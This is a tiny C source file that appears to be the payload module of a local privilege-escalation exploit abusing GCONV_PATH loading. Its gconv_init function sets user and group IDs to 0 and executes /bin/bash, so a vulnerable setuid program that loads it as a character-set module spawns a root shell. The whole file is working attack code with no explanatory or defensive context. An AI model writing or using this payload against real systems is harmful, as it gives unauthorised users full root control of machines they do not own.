#include <unistd.h>

void gconv() {}

void gconv_init()
{
    setuid(0);
    setgid(0);

    char* argv[] = { NULL };
    char* envp[] = { NULL };
    execve("/bin/bash", argv, envp);
}
